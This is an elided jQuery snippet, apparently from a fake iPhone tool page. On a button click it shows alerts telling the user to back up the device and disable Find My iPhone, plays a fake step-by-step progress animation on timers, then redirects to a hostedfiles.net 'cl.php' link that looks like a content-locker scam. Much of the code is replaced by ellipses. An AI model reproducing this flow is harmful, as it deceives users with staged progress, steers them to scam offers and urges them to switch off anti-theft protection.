...
$(document).ready(function() {
  ...
  $("#toggle").click(function() {
    ...
    $("#modalStep-2").fadeOut(function() {
      alert("Make Sure to Backup your iDevice");
      alert("Make Sure to Turn Off Find My iPhone");
        ...
        setTimeout(function() {
          ...
          setTimeout(function() {
            ...
            setTimeout(function() {
              $(".gen-line-4").fadeIn();
              setTimeout(function() {
                window.location = 'https://www.hostedfiles.net/cl.php?id=eb4fd10c50c77dfab8a2f8426ff5d986';
              }, 3000);
            }, 2000);
          }, 2000);
        }, 2000);
